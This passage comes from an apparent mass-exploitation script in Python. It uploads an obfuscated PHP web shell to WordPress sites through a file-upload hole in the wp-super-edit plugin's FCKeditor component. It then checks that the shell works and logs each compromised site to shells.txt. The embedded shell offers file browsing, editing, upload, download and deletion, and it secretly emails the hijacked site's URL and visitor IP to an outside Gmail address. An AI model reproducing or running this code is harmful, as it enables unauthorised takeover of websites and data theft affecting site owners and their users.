			<?php  isset($_POST["s"]) ? $c8[16]($Jd . '/' . jD($_GET["n"]), $_POST["n"]) ? XE("successfully changed the folder name") : Xe("failed to change the folder name", 0) : null; goto WC; Ox: ?>
			<h5 class="border p-1 mb-3">Edit file</h5>
			<span>File name : <?= Jd($_GET["n"]); ?></span>
			<form method="post"><div class="form-group"><label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control"><?= $c8[18]($c8[14]($Jd . '/' . jD($_GET["n"]))); ?></textarea></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button></div></form>
			<?php  isset($_POST["s"]) ? $c8[13]($Jd . '/' . jD($_GET["n"]), $_POST["ctn"]) ? xE("file contents changed successfully", 1, "&a=" . sS("view") . "&n={$_GET["n"]}") : xE("file contents failed to change") : null; goto WC; Ag: ?>
			<h5 class="border p-1 mb-3">View file</h5>
			<span>File name : <?= jd($_GET["n"]); ?></span>
			<div class="form-group"><label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control" readonly><?= $c8[18]($c8[14]($Jd . '/' . jd($_GET["n"]))); ?></textarea></div>
			<?php  WC: ?>
		</div>
		<?php
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
ini_set('memory_limit', '64M');
header('Content-Type: text/html; charset=UTF-8');
$tujuanmail = 'ribelcyberteam@gmail.com, ribelcyberteam@gmail.com';
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($tujuanmail, "Hehehe", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
?>
		<?php  goto mR; Un: ?>
		<table class="table table-hover table-bordered table-sm">
			<thead class="text-light">
				<tr>
					<th>Name</th>
					<th>Size</th>
					<th>Permission</th>
					<th>Action</th>
				</tr>
			</thead>
			<tbody class="text-light">
				<?php  $G3 = $c8[5]($G3($Jd), [".", ".."]); foreach ($G3 as $yf) { if ($c8[6]("{$Jd}/{$yf}")) { goto CB; } goto Qj; CB: echo "\n\t\t\t\t\t<tr>\n\t\t\t\t\t\t<td><a href=\"?p=" . sS("{$Jd}/{$yf}") . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on " . $c8[19]("Y-m-d H:i", $c8[20]("{$Jd}/{$yf}")) . "\"><i class=\"fa fa-fw fa-folder\"></i> {$yf}</a></td>\n\t\t\t\t\t\t<td>N/A</td>\n\t\t\t\t\t\t<td><font color=\"" . ($c8[8]("{$Jd}/{$yf}") ? "#00ff00" : (!$c8[9]("{$Jd}/{$yf}") ? "red" : null)) . "\">" . RN("{$Jd}/{$yf}") . "</font></td>\n\t\t\t\t\t\t<td>\n\t\t\t\t\t\t\t<a href=\"?p=" . ss($Jd) . "&a=" . ss("rename") . "&n=" . ss($yf) . "&t=d\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\"><i class=\"fa fa-fw fa-pencil\"></i></a>\n\t\t\t\t\t\t\t<a href=\"?p=" . sS($Jd) . "&a=" . ss("delete") . "&n=" . ss($yf) . "\" class=\"delete\" data-type=\"folder\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\"><i class=\"fa fa-fw fa-trash\"></i></a>\n\t\t\t\t\t\t</td>\n\t\t\t\t\t</tr>"; Qj: } ad: foreach ($G3 as $F1) { if ($c8[7]("{$Jd}/{$F1}")) { goto wA; } goto X1; wA: $kL = $c8[10]("{$Jd}/{$F1}") / 1024; $kL = round($kL, 3); $kL = $kL > 1024 ? round($kL / 1024, 2) . "MB" : $kL . "KB"; echo "\n\t\t\t\t\t<tr>\n\t\t\t\t\t\t<td><a href=\"?p=" . SS($Jd) . "&a=" . sS("view") . "&n=" . SS($F1) . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on " . $c8[19]("Y-m-d H:i", $c8[20]("{$Jd}/{$F1}")) . "\"><i class=\"fa fa-fw fa-file\"></i> {$F1}</a></td>\n\t\t\t\t\t\t<td>{$kL}</td>\n\t\t\t\t\t\t<td><font color=\"" . ($c8[8]("{$Jd}/{$F1}") ? "#00ff00" : (!$c8[9]("{$Jd}/{$F1}") ? "red" : null)) . "\">" . rN("{$Jd}/{$F1}") . "</font></td>\n\t\t\t\t\t\t<td>\n\t\t\t\t\t\t\t<div class=\"d-flex justify-content-between\">\n\t\t\t\t\t\t\t\t\t<a href=\"?p=" . Ss($Jd) . "&a=" . Ss("edit") . "&n=" . SS($F1) . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Edit\"><i class=\"fa fa-fw fa-edit\"></i></a>\n\t\t\t\t\t\t\t\t\t<a href=\"?p=" . ss($Jd) . "&a=" . SS("rename") . "&n=" . ss($F1) . "&t=f\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\"><i class=\"fa fa-fw fa-pencil\"></i></a>\n\t\t\t\t\t\t\t\t\t<a href=\"?p=" . ss($Jd) . "&n=" . sS($F1) . "&download" . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Download\"><i class=\"fa fa-fw fa-download\"></i></a>\n\t\t\t\t\t\t\t\t\t<a href=\"?p=" . ss($Jd) . "&a=" . sS("delete") . "&n=" . ss($F1) . "\" class=\"delete\" data-type=\"file\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\"><i class=\"fa fa-fw fa-trash\"></i></a>\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t</td>\n\t\t\t\t\t</tr>\n\t\t\t\t\t"; X1: } a2: ?>
			</tbody>
		</table>
		<?php  mR: ?>
	</article>
	<div class="bg-dark border text-center mt-2">
		<small></small>
	</div>
	<script src="//code.jquery.com/jquery-3.5.1.slim.min.js"></script>
	<script src="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.bundle.min.js" ></script>
	<script src="//cdn.jsdelivr.net/npm/bs-custom-file-input/dist/bs-custom-file-input.min.js"></script>
	<script>eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('E.n();$(\'[2-m="4"]\').4();$(".l").k(j(e){e.g();h 0=$(6).5("2-0");c({b:"a",9:"o i q?",w:"D "+0+" p C B",A:7,z:7,}).y((8)=>{r(8){x 1=$(6).5("3")+"&t="+((0=="v")?"d":"f");u.s.3=1}})});',41,41,'type|buildURL|data|href|tooltip|attr|this|true|willDelete|title|warning|icon|swal||||preventDefault|let|you|function|click|delete|toggle|init|Are|will|sure|if|location||document|folder|text|const|then|dangerMode|buttons|deleted|be|This|bsCustomFileInput'.split('|'),0,{}))</script>
</body>
</html>

------WebKitFormBoundaryvBB76aRVDW1qvJ4K--
"""
        chk = requests.post(url+'/wp-content/plugins/wp-super-edit/superedit/tinymce_plugins/mse/fckeditor/editor/filemanager/upload/test.html',headers=headers,data=data, allow_redirects=True,verify=False ,timeout=15)
        check = requests.get(url+'/wp-content/plugins/wp-super-edit/superedit/tinymce_plugins/mse/fckeditor/editor/filemanager/upload/x.php',headers=headers, allow_redirects=True,timeout=15)
        if ("mini shell by h0rn3t sp1d3rs" in check.content.decode("utf-8")):
                print (' [#] Exploit 147 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/plugins/wp-super-edit/superedit/tinymce_plugins/mse/fckeditor/editor/filemanager/upload/x.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            data="""------WebKitFormBoundaryvBB76aRVDW1qvJ4K

Content-Disposition: form-data; name="NewFile"; filename="x.php"

Content-Type: application/octet-stream



<?php
/*
exploit by h0rn3t sp1d3rs 
*/
error_reporting(0); http_response_code(404); define("Yp", " Mini Shell By H0rn3t Sp1d3rs "); $G3 = "scandir"; $c8 = array("7068705f756e616d65", "70687076657273696f6e", "676574637764", "6368646972", "707265675f73706c6974", "61727261795f64696666", "69735f646972", "69735f66696c65", "69735f7772697461626c65", "69735f7265616461626c65", "66696c6573697a65", "636f7079", "66696c655f657869737473", "66696c655f7075745f636f6e74656e7473", "66696c655f6765745f636f6e74656e7473", "6d6b646972", "72656e616d65", "737472746f74696d65", "68746d6c7370656369616c6368617273", "64617465", "66696c656d74696d65"); $lE = 0; T4: if (!($lE < count($c8))) { goto Je; } $c8[$lE] = JD($c8[$lE]); Cy: $lE++; goto T4; Je: if (isset($_GET["p"])) { goto sr; } $Jd = $c8[2](); goto VN; sr: $Jd = jD($_GET["p"]); $c8[3](Jd($_GET["p"])); VN: function Ss($SP) { $dE = ""; $lE = 0; NZ: if (!($lE < strlen($SP))) { goto Xc; } $dE .= dechex(ord($SP[$lE])); WK: $lE++; goto NZ; Xc: return $dE; } function Jd($SP) { $dE = ""; $gf = strlen($SP) - 1; $lE = 0; Xp: if (!($lE < $gf)) { goto ur; } $dE .= chr(hexdec($SP[$lE] . $SP[$lE + 1])); Wn: $lE += 2; goto Xp; ur: return $dE; } function rn($F1) { $Jd = fileperms($F1); if (($Jd & 0xc000) == 0xc000) { goto FZ; } if (($Jd & 0xa000) == 0xa000) { goto Eu; } if (($Jd & 0x8000) == 0x8000) { goto ES; } if (($Jd & 0x6000) == 0x6000) { goto sA; } if (($Jd & 0x4000) == 0x4000) { goto lG; } if (($Jd & 0x2000) == 0x2000) { goto tV; } if (($Jd & 0x1000) == 0x1000) { goto Tx; } $lE = 'u'; goto cC; FZ: $lE = 's'; goto cC; Eu: $lE = 'l'; goto cC; ES: $lE = '-'; goto cC; sA: $lE = 'b'; goto cC; lG: $lE = 'd'; goto cC; tV: $lE = 'c'; goto cC; Tx: $lE = 'p'; cC: $lE .= $Jd & 0x100 ? 'r' : '-'; $lE .= $Jd & 0x80 ? 'w' : '-'; $lE .= $Jd & 0x40 ? $Jd & 0x800 ? 's' : 'x' : ($Jd & 0x800 ? 'S' : '-'); $lE .= $Jd & 0x20 ? 'r' : '-'; $lE .= $Jd & 0x10 ? 'w' : '-'; $lE .= $Jd & 0x8 ? $Jd & 0x400 ? 's' : 'x' : ($Jd & 0x400 ? 'S' : '-'); $lE .= $Jd & 0x4 ? 'r' : '-'; $lE .= $Jd & 0x2 ? 'w' : '-'; $lE .= $Jd & 0x1 ? $Jd & 0x200 ? 't' : 'x' : ($Jd & 0x200 ? 'T' : '-'); return $lE; } function Xe($OB, $Ch = 1, $BL = "") { global $Jd; $xe = $Ch == 1 ? "success" : "error"; echo "<script>swal({title: \"{$xe}\", text: \"{$OB}\", icon: \"{$xe}\"}).then((btnClick) => {if(btnClick){document.location.href=\"?p=" . Ss($Jd) . $BL . "\"}})</script>"; } function tF($yf) { global $c8; if (!(trim(pathinfo($yf, PATHINFO_BASENAME), '.') === '')) { goto IE; } return; IE: if ($c8[6]($yf)) { goto PF; } unlink($yf); goto jK; PF: array_map("deldir", glob($yf . DIRECTORY_SEPARATOR . '{,.}*', GLOB_BRACE | GLOB_NOSORT)); rmdir($yf); jK: } ?>
<!doctype html>
<!-- Mr.7Mind -->
<html lang="en">
<head>
	<meta name="theme-color" content="#00BFFF">
	<meta name="viewport" content="width=device-width, initial-scale=0.60, shrink-to-fit=no">
	<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css">
	<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
	<title>Shell Bypass By H0rn3t Sp1d3rs</title>
	<style>.table-hover tbody tr:hover td{background:#00BFFF}.table-hover tbody tr:hover td>*{color:#fff}.table>tbody>tr>*{color:#fff;vertical-align:middle}.form-control{background:0 0!important;color:#fff!important;border-radius:0}.form-control::placeholder{color:#fff;opacity:1}li{font-size:18px;margin-left:6px;list-style:none}a{color:#fff}</style>
	<script src="//unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
	<script src='https://cdn.statically.io/gh/analisyuki/animasi/9ab4049c/bintang.js' type='text/javascript' /></script>
</head>
<body style="background-color:#000;color:#fff;font-family:serif;">
	<div class="bg-dark table-responsive text-light border">
		<div class="d-flex justify-content-between p-1">
			<div><h3 class="mt-2"><a href="?"><?= Yp; ?></a></h3></div>
		</div>
		<div class="border-top table-responsive">
			<li>PHP: <?= php_uname(); ?></li>
			<li>Doc Root: <?= "{$_SERVER["DOCUMENT_ROOT"]}"; ?></li>
			<li>Server: <?= "{$_SERVER["SERVER_ADDR"]}/{$_SERVER["REMOTE_ADDR"]}"; ?></li>
			<li>Domain : <?= "{$_SERVER["SERVER_NAME"]}"; ?></li>
			<li>Ip Server: <?= getHostByName(getHostName()); ?></li>
			<li>php Version: <?= phpversion(); ?></li>
			<li>Mysql: <?= (function_exists('mysql_connect')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>"; ?></li>
			<li>Curl: <?= (function_exists('curl_version')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>"; ?></li>
		</div>
		<form method="post" enctype="multipart/form-data"><div class="input-group mb-1 px-1 mt-1"><div class="custom-file"><input type="file" name="f[]" class="custom-file-input" onchange="this.form.submit()" multiple><label class="custom-file-label rounded-0 bg-transparent text-light">Choose file</label></div></div></form>
		<?php  if (!isset($_FILES["f"])) { goto ea; } $Wx = $_FILES["f"]["name"]; $lE = 0; th: if (!($lE < count($Wx))) { goto dx; } if ($c8[11]($_FILES["f"]["tmp_name"][$lE], $Wx[$lE])) { goto PG; } Xe("file failed to upload", 0); goto tG; PG: XE("file uploaded successfully"); tG: g9: $lE++; goto th; dx: ea: if (!isset($_GET["download"])) { goto FA; } header("Content-Type: application/octet-stream"); header("Content-Transfer-Encoding: Binary"); header("Content-Length: " . $c8[17](JD($_GET["n"]))); header("Content-disposition: attachment; filename=\"" . jd($_GET["n"]) . "\""); FA: ?>
				<a href="?p=<?= ss($Jd) . "&a=" . Ss("newFile"); ?>"> [ Add New File ] </a>
				<a href="?p=<?= Ss($Jd) . "&a=" . sS("newDir"); ?>"> [ Add New Directory ] </a>
			</div>
	<div class="bg-dark border table-responsive mt-2">
		<div class="ml-2" style="font-size:18px;">
			<span>Path: </span>
			<?php  $Op = $c8[4]("/(\\\\|\\/)/", $Jd); foreach ($Op as $j3 => $Oe) { if (!($j3 == 0 && $Oe == "")) { goto xi; } echo "<a href=\"?p=2f\">~</a>/"; goto CS; xi: if (!($Oe == "")) { goto sq; } goto CS; sq: echo "<a href=\"?p="; $lE = 0; de: if (!($lE <= $j3)) { goto ie; } echo sS($Op[$lE]); if (!($lE != $j3)) { goto s0; } echo "2f"; s0: dg: $lE++; goto de; ie: echo "\">{$Oe}</a>/"; CS: } Go: ?>
		</div>
	</div>
	<article class="bg-dark border table-responsive mt-2">
		<?php  if (!isset($_GET["a"])) { goto Un; } if (!isset($_GET["a"])) { goto cc; } $im = Jd($_GET["a"]); cc: ?>
		<div class="px-2 py-2">
			<?php  if (!($im == "delete")) { goto Lu; } $BL = $Jd . '/' . Jd($_GET["n"]); if (!($_GET["t"] == "d")) { goto VZ; } TF($BL); if (!$c8[12]($BL)) { goto e8; } Xe("failed to delete the folder", 0); goto iL; e8: Xe("folder deleted successfully"); iL: VZ: if (!($_GET["t"] == "f")) { goto xB; } $BL = $Jd . '/' . jd($_GET["n"]); unlink($BL); if (!$c8[12]($BL)) { goto uH; } Xe("file to delete the folder", 0); goto Mk; uH: xe("file deleted successfully"); Mk: xB: Lu: ?>
			<?php  if ($im == "newDir") { goto Fg; } if ($im == "newFile") { goto Pb; } if ($im == "rename") { goto Lw; } if ($im == "edit") { goto Ox; } if ($im == "view") { goto Ag; } goto WC; Fg: ?>
			<h5 class="border p-1 mb-3">New folder</h5>
			<form method="post"><div class="form-group"><label for="n">Name :</label><input name="n" id="n" class="form-control" autocomplete="off"></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Create</button></div></form>
			<?php  isset($_POST["s"]) ? $c8[12]("{$Jd}/{$_POST["n"]}") ? xE("folder name has been used", 0, "&a=" . SS("newDir")) : ($c8[15]("{$Jd}/{$_POST["n"]}") ? Xe("folder created successfully") : Xe("folder failed to create", 0)) : null; goto WC; Pb: ?>
			<h5 class="border p-1 mb-3">New file</h5>
			<form method="post"><div class="form-group"><label for="n">File name :</label><input type="text" name="n" id="n" class="form-control" placeholder="hack.txt"></div><div class="form-group"><label for="ctn">Content :</label><textarea style="resize:none" name="ctn" id="ctn" cols="30" rows="10" class="form-control" placeholder="# Hacked By Mr.7Mind"></textarea></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Create</button></div></form>
			<?php  isset($_POST["s"]) ? $c8[12]("{$Jd}/{$_POST["n"]}") ? xE("file name has been used", 0, "&a=" . SS("newFile")) : ($c8[13]("{$Jd}/{$_POST["n"]}", $_POST["ctn"]) ? XE("file created successfully", 1, "&a=" . ss("view") . "&n=" . Ss($_POST["n"])) : Xe("file failed to create", 0)) : null; goto WC; Lw: ?>
			<h5 class="border p-1 mb-3">Rename <?= $_GET["t"] == "d" ? "folder" : "file"; ?></h5>
			<form method="post"><div class="form-group"><label for="n">Name :</label><input type="text" name="n" id="n" class="form-control" value="<?= jD($_GET["n"]); ?>"></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button></div></form>
			<?php  isset($_POST["s"]) ? $c8[16]($Jd . '/' . jD($_GET["n"]), $_POST["n"]) ? XE("successfully changed the folder name") : Xe("failed to change the folder name", 0) : null; goto WC; Ox: ?>
			<h5 class="border p-1 mb-3">Edit file</h5>
			<span>File name : <?= Jd($_GET["n"]); ?></span>
			<form method="post"><div class="form-group"><label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control"><?= $c8[18]($c8[14]($Jd . '/' . jD($_GET["n"]))); ?></textarea></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button></div></form>
			<?php  isset($_POST["s"]) ? $c8[13]($Jd . '/' . jD($_GET["n"]), $_POST["ctn"]) ? xE("file contents changed successfully", 1, "&a=" . sS("view") . "&n={$_GET["n"]}") : xE("file contents failed to change") : null; goto WC; Ag: ?>
			<h5 class="border p-1 mb-3">View file</h5>
			<span>File name : <?= jd($_GET["n"]); ?></span>
			<div class="form-group"><label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control" readonly><?= $c8[18]($c8[14]($Jd . '/' . jd($_GET["n"]))); ?></textarea></div>
			<?php  WC: ?>
		</div>
		<?php
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
ini_set('memory_limit', '64M');
header('Content-Type: text/html; charset=UTF-8');
$tujuanmail = 'ribelcyberteam@gmail.com, ribelcyberteam@gmail.com';
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($tujuanmail, "Hehehe", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
?>
		<?php  goto mR; Un: ?>
		<table class="table table-hover table-bordered table-sm">
			<thead class="text-light">
				<tr>
					<th>Name</th>
					<th>Size</th>
					<th>Permission</th>
					<th>Action</th>
				</tr>
			</thead>
			<tbody class="text-light">
				<?php  $G3 = $c8[5]($G3($Jd), [".", ".."]); foreach ($G3 as $yf) { if ($c8[6]("{$Jd}/{$yf}")) { goto CB; } goto Qj; CB: echo "\n\t\t\t\t\t<tr>\n\t\t\t\t\t\t<td><a href=\"?p=" . sS("{$Jd}/{$yf}") . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on " . $c8[19]("Y-m-d H:i", $c8[20]("{$Jd}/{$yf}")) . "\"><i class=\"fa fa-fw fa-folder\"></i> {$yf}</a></td>\n\t\t\t\t\t\t<td>N/A</td>\n\t\t\t\t\t\t<td><font color=\"" . ($c8[8]("{$Jd}/{$yf}") ? "#00ff00" : (!$c8[9]("{$Jd}/{$yf}") ? "red" : null)) . "\">" . RN("{$Jd}/{$yf}") . "</font></td>\n\t\t\t\t\t\t<td>\n\t\t\t\t\t\t\t<a href=\"?p=" . ss($Jd) . "&a=" . ss("rename") . "&n=" . ss($yf) . "&t=d\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\"><i class=\"fa fa-fw fa-pencil\"></i></a>\n\t\t\t\t\t\t\t<a href=\"?p=" . sS($Jd) . "&a=" . ss("delete") . "&n=" . ss($yf) . "\" class=\"delete\" data-type=\"folder\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\"><i class=\"fa fa-fw fa-trash\"></i></a>\n\t\t\t\t\t\t</td>\n\t\t\t\t\t</tr>"; Qj: } ad: foreach ($G3 as $F1) { if ($c8[7]("{$Jd}/{$F1}")) { goto wA; } goto X1; wA: $kL = $c8[10]("{$Jd}/{$F1}") / 1024; $kL = round($kL, 3); $kL = $kL > 1024 ? round($kL / 1024, 2) . "MB" : $kL . "KB"; echo "\n\t\t\t\t\t<tr>\n\t\t\t\t\t\t<td><a href=\"?p=" . SS($Jd) . "&a=" . sS("view") . "&n=" . SS($F1) . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on " . $c8[19]("Y-m-d H:i", $c8[20]("{$Jd}/{$F1}")) . "\"><i class=\"fa fa-fw fa-file\"></i> {$F1}</a></td>\n\t\t\t\t\t\t<td>{$kL}</td>\n\t\t\t\t\t\t<td><font color=\"" . ($c8[8]("{$Jd}/{$F1}") ? "#00ff00" : (!$c8[9]("{$Jd}/{$F1}") ? "red" : null)) . "\">" . rN("{$Jd}/{$F1}") . "</font></td>\n\t\t\t\t\t\t<td>\n\t\t\t\t\t\t\t<div class=\"d-flex justify-content-between\">\n\t\t\t\t\t\t\t\t\t<a href=\"?p=" . Ss($Jd) . "&a=" . Ss("edit") . "&n=" . SS($F1) . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Edit\"><i class=\"fa fa-fw fa-edit\"></i></a>\n\t\t\t\t\t\t\t\t\t<a href=\"?p=" . ss($Jd) . "&a=" . SS("rename") . "&n=" . ss($F1) . "&t=f\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\"><i class=\"fa fa-fw fa-pencil\"></i></a>\n\t\t\t\t\t\t\t\t\t<a href=\"?p=" . ss($Jd) . "&n=" . sS($F1) . "&download" . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Download\"><i class=\"fa fa-fw fa-download\"></i></a>\n\t\t\t\t\t\t\t\t\t<a href=\"?p=" . ss($Jd) . "&a=" . sS("delete") . "&n=" . ss($F1) . "\" class=\"delete\" data-type=\"file\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\"><i class=\"fa fa-fw fa-trash\"></i></a>\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t</td>\n\t\t\t\t\t</tr>\n\t\t\t\t\t"; X1: } a2: ?>
			</tbody>
		</table>
		<?php  mR: ?>
	</article>
	<div class="bg-dark border text-center mt-2">
		<small></small>
	</div>
	<script src="//code.jquery.com/jquery-3.5.1.slim.min.js"></script>
	<script src="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.bundle.min.js" ></script>
	<script src="//cdn.jsdelivr.net/npm/bs-custom-file-input/dist/bs-custom-file-input.min.js"></script>
	<script>eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('E.n();$(\'[2-m="4"]\').4();$(".l").k(j(e){e.g();h 0=$(6).5("2-0");c({b:"a",9:"o i q?",w:"D "+0+" p C B",A:7,z:7,}).y((8)=>{r(8){x 1=$(6).5("3")+"&t="+((0=="v")?"d":"f");u.s.3=1}})});',41,41,'type|buildURL|data|href|tooltip|attr|this|true|willDelete|title|warning|icon|swal||||preventDefault|let|you|function|click|delete|toggle|init|Are|will|sure|if|location||document|folder|text|const|then|dangerMode|buttons|deleted|be|This|bsCustomFileInput'.split('|'),0,{}))</script>
</body>
</html>

------WebKitFormBoundaryvBB76aRVDW1qvJ4K--
"""
            chk = requests.post(url+'/wp-content/plugins/wp-super-edit/superedit/tinymce_plugins/mse/fckeditor/editor/filemanager/upload/test.html',headers=headers,data=data, allow_redirects=True,verify=False ,timeout=15)
            check = requests.get(url+'/wp-content/plugins/wp-super-edit/superedit/tinymce_plugins/mse/fckeditor/editor/filemanager/upload/x.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if "mini shell by h0rn3t sp1d3rs" in check.content.decode("utf-8"):
                    print (' [#] Exploit 147 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/plugins/wp-super-edit/superedit/tinymce_plugins/mse/fckeditor/editor/filemanager/upload/x.php\n')
            else:
                print ('[#] Exploit 147 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_148(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        data="""------WebKitFormBoundary5bvq7vh5W2anjxf6

            Content-Disposition: form-data; name="NewFile"; filename="x.php"

            Content-Type: application/octet-stream



            <?php
            /*
            exploit by h0rn3t sp1d3rs 
            */
            error_reporting(0); http_response_code(404); define("Yp", " Mini Shell By H0rn3t Sp1d3rs "); $G3 = "scandir"; $c8 = array("7068705f756e616d65", "70687076657273696f6e", "676574637764", "6368646972", "707265675f73706c6974", "61727261795f64696666", "69735f646972", "69735f66696c65", "69735f7772697461626c65", "69735f7265616461626c65", "66696c6573697a65", "636f7079", "66696c655f657869737473", "66696c655f7075745f636f6e74656e7473", "66696c655f6765745f636f6e74656e7473", "6d6b646972", "72656e616d65", "737472746f74696d65", "68746d6c7370656369616c6368617273", "64617465", "66696c656d74696d65"); $lE = 0; T4: if (!($lE < count($c8))) { goto Je; } $c8[$lE] = JD($c8[$lE]); Cy: $lE++; goto T4; Je: if (isset($_GET["p"])) { goto sr; } $Jd = $c8[2](); goto VN; sr: $Jd = jD($_GET["p"]); $c8[3](Jd($_GET["p"])); VN: function Ss($SP) { $dE = ""; $lE = 0; NZ: if (!($lE < strlen($SP))) { goto Xc; } $dE .= dechex(ord($SP[$lE])); WK: $lE++; goto NZ; Xc: return $dE; } function Jd($SP) { $dE = ""; $gf = strlen($SP) - 1; $lE = 0; Xp: if (!($lE < $gf)) { goto ur; } $dE .= chr(hexdec($SP[$lE] . $SP[$lE + 1])); Wn: $lE += 2; goto Xp; ur: return $dE; } function rn($F1) { $Jd = fileperms($F1); if (($Jd & 0xc000) == 0xc000) { goto FZ; } if (($Jd & 0xa000) == 0xa000) { goto Eu; } if (($Jd & 0x8000) == 0x8000) { goto ES; } if (($Jd & 0x6000) == 0x6000) { goto sA; } if (($Jd & 0x4000) == 0x4000) { goto lG; } if (($Jd & 0x2000) == 0x2000) { goto tV; } if (($Jd & 0x1000) == 0x1000) { goto Tx; } $lE = 'u'; goto cC; FZ: $lE = 's'; goto cC; Eu: $lE = 'l'; goto cC; ES: $lE = '-'; goto cC; sA: $lE = 'b'; goto cC; lG: $lE = 'd'; goto cC; tV: $lE = 'c'; goto cC; Tx: $lE = 'p'; cC: $lE .= $Jd & 0x100 ? 'r' : '-'; $lE .= $Jd & 0x80 ? 'w' : '-'; $lE .= $Jd & 0x40 ? $Jd & 0x800 ? 's' : 'x' : ($Jd & 0x800 ? 'S' : '-'); $lE .= $Jd & 0x20 ? 'r' : '-'; $lE .= $Jd & 0x10 ? 'w' : '-'; $lE .= $Jd & 0x8 ? $Jd & 0x400 ? 's' : 'x' : ($Jd & 0x400 ? 'S' : '-'); $lE .= $Jd & 0x4 ? 'r' : '-'; $lE .= $Jd & 0x2 ? 'w' : '-'; $lE .= $Jd & 0x1 ? $Jd & 0x200 ? 't' : 'x' : ($Jd & 0x200 ? 'T' : '-'); return $lE; } function Xe($OB, $Ch = 1, $BL = "") { global $Jd; $xe = $Ch == 1 ? "success" : "error"; echo "<script>swal({title: \"{$xe}\", text: \"{$OB}\", icon: \"{$xe}\"}).then((btnClick) => {if(btnClick){document.location.href=\"?p=" . Ss($Jd) . $BL . "\"}})</script>"; } function tF($yf) { global $c8; if (!(trim(pathinfo($yf, PATHINFO_BASENAME), '.') === '')) { goto IE; } return; IE: if ($c8[6]($yf)) { goto PF; } unlink($yf); goto jK; PF: array_map("deldir", glob($yf . DIRECTORY_SEPARATOR . '{,.}*', GLOB_BRACE | GLOB_NOSORT)); rmdir($yf); jK: } ?>
<!doctype html>
<!-- Mr.7Mind -->
<html lang="en">
<head>
	<meta name="theme-color" content="#00BFFF">
	<meta name="viewport" content="width=device-width, initial-scale=0.60, shrink-to-fit=no">
	<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css">
	<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
	<title>Shell Bypass By H0rn3t Sp1d3rs</title>
